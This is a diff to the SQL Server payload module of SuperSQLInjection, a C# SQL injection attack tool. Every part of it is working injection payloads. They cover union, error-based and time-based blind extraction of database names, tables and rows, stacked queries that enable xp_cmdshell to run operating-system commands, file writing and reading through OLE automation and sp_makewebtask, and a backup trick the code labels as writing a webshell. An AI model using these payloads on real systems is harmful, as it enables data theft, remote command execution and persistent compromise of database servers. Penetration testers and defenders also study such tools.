@@ -5,21 +5,21 @@ using tools;
 
 namespace SuperSQLInjection.payload
 {
-    class MSSQL
+    class SQLServer
     {
         //加载对应配置(需要读取的环境变量)
-        public static String path = "config/sqlserver/ver.txt";
+        public static String path = "config/vers/sqlserver.txt";
         public static List<String> vers = FileTool.readFileToList(path);
 
 
         //数据库数量
-        public static String dbs_count = "(select count(*) from [master]..[sysdatabases])";
+        public static String dbs_count = "(select count(1) from [master]..[sysdatabases])";
         //表数量
-        public static String tables_count = "(select count(*) from [{dbname}]..[sysobjects] where xtype=0x55)";
+        public static String tables_count = "(select count(1) from [{dbname}]..[sysobjects] where xtype=0x55)";
         //列数量
-        public static String columns_count = "(select count(*) from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))";
+        public static String columns_count = "(select count(1) from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))";
         //获取数据条数
-        public static String data_count = "(select count(*) from [{dbname}]..[{table}])";
+        public static String data_count = "(select count(1) from [{dbname}]..[{table}])";
 
 
         //获取数据库名
@@ -57,10 +57,13 @@ namespace SuperSQLInjection.payload
 
         //每个unicode值范围0-9
         public static String bool_unicode_value = " (substring({data},{index},1))>{len}";
-        
-        //获取行数据
-        public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";
 
+        //获取行数据bool方式
+        public static String data_value_bool = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";
+
+        //解决存在text，BINARY等多种数据类型时，存在空值，sql报错无法获取数据的问题
+        public static String data_value = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc for xml raw,binary base64)";
+        
         //union获取值
         public static String union_value = " 1=2 union all select {data}";
 
@@ -69,24 +72,30 @@ namespace SuperSQLInjection.payload
 
 
         //cmd
-        public static String createTable = " 1=1;drop table ssqlinjection;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
+        public static String createTableAndExecCmd = " 1=1;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
         public static String cmdData = "cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))";
-        public static String cmdDataCount = "(select (select count(*) from ssqlinjection))";
+        public static String cmdDataCount = "(select (select count(1) from ssqlinjection))";
         public static String dropTable = " 1=1;drop table ssqlinjection;select 1 where 1=1 ";
+
+        public static String dropWriteFileBackUpTableAndDropDB = " 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 ";
+
+        public static String createWriteFileBackUpTable = " 1=1;create table [ssqlinjection]..[data] (content image);select 1 where 1=1 ";
+
+        public static String createWriteFileBackUpDB = " 1=1;create database ssqlinjection;select 1 where 1=1 ";
 
 
         //文件读写
         public static String witeFileByFileSystemObject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data={data};declare @path varchar(4000);set @path={path};exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;select 1 where 1=1 ";
         public static String witeFileBySP_MakeWebTask = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'web assistant procedures',1;reconfigure;declare @d varchar(8000);set @d={data};declare @p varchar(4000);set @p={path};exec sp_makewebtask @p, @d;select 1 where 1=1 ";
-        public static String witeFileByBackDataBase = " 1=1;drop database ssqlinjection;create database ssqlinjection;drop table [ssqlinjection]..[data];create table [ssqlinjection]..[data] (content image);insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 ";
-        public static String readFileByFileSystemobject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';drop table ssqlinjection;create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 ";
+        public static String witeFileByBackDataBase = " 1=1;insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 ";
+        public static String readFileByFileSystemobject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 ";
 
         //读文件的的payload
         public static String file_content = "(select data from ssqlinjection)";
 
-        public static String getBoolCountBySleep(String data, int maxTime)
+        public static String getBoolDataBySleep(String data, int maxTime)
         {
-            return ";if(0x1=0x1" + data + ") waitfor delay '0:0:"+ maxTime + "'";
+            return " if(" + data + ") waitfor delay '0:0:" + maxTime + "'";
         }
 
         /// <summary>
@@ -102,14 +111,14 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen,int showIndex,String Fill,String dbname,String table,List<String> columns,int index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
+            String data = data_value.Replace("{data}", Comm.unionColumns(columns,",")).Replace("{orderby}", columns[0]);
             for (int i = 1; i <= columnsLen; i++)
             {
 
                 if (i == showIndex)
                 {
-                    String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{index}", index.ToString());
-                    sb.Append("(char(94)+char(94)+char(33)+cast(" + d + " as varchar(8000))+char(33)+char(94)+char(94)),");
+                    String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
+                    sb.Append("(char(94)+char(94)+char(33)+" +d+ "+char(33)+char(94)+char(94)),");
                 }
                 else
                 {
@@ -195,7 +204,7 @@ namespace SuperSQLInjection.payload
 
 
         /// <summary>
-        /// 调用前需调用setDataValue方法
+        /// 
         /// </summary>
         /// <param name="columnsLen">列长</param>
         /// <param name="showIndex">显示列</param>
@@ -206,8 +215,8 @@ namespace SuperSQLInjection.payload
         /// <param name="index">第几行数据，1开始</param>
         public static String getErrorDataValue(String dbname, String table,int index,List<String> columns)
         {
-            String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
-            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{column}", concatAllColumnsByConcatStr(columns)).Replace("{index}", index.ToString());
+            String data = data_value.Replace("{data}", Comm.unionColumns(columns,",")).Replace("{orderby}", columns[0]);
+            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
             return error_value.Replace("{data}", d);
         }
 
@@ -227,37 +236,7 @@ namespace SuperSQLInjection.payload
             sb.Remove(sb.Length - 1, 1);
             return sb.ToString();
         }
-        /// <summary>
-        /// 多字段拼接，带连接符
-        /// </summary>
-        /// <param name="columns"></param>
-        /// <returns></returns>
-        public static String concatAllColumnsByConcatStr(List<String> columns)
-        {
-            StringBuilder sb = new StringBuilder();
-            foreach (String column in columns)
-            {
-
-                sb.Append("cast(isnull(" + column + ",0x20) as varchar(5000))+char(36)+char(36)+char(36)+");
-            }
-            sb.Remove(sb.Length - 28, 28);
-            return sb.ToString();
-        }
-
-
-        /// <summary>
-        /// 值的长度
-        /// </summary>
-        /// <param name="dataPayload"></param>
-        /// <returns></returns>
-        public static String getBoolLengthPayLoad(String dataStr,int len)
-        {
-            
-            bool_length.Replace("{data}",unicode_value.Replace("{data}", dataStr)).Replace("{len}",len.ToString());
-
-            return dataStr;
-        }
-
+       
         /// <summary>
         /// 获得bool方式值payload
         /// </summary>
@@ -268,10 +247,23 @@ namespace SuperSQLInjection.payload
         /// <returns></returns>
         public static String getBoolDataPayLoad(String column,List<String> columns,String dbName,String table,int index)
         {
-            String data = data_value.Replace("{data}", "cast(isnull("+column+",0x20) as varchar)").Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
+            String data = data_value_bool.Replace("{data}", "cast(isnull("+column+ ",space(1)) as varchar)").Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
             String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
             return payload;
         }
 
+        /// <summary>
+        /// 反射条调用，加载显示支持的文件操作
+        /// </summary>
+        /// <returns></returns>
+        public static List<String> getShowCanDoFile()
+        {
+            List<String> list = new List<String>();
+            list.Add("SQLServer FileSystemObject写文件");
+            list.Add("SQLServer Sp_MakeWebTask写文件");
+            list.Add("SQLServer 备份写WebShell(有多余数据)");
+            list.Add("SQLServer FileSystemObject读文件");
+            return list;     
+        }
     }
 }
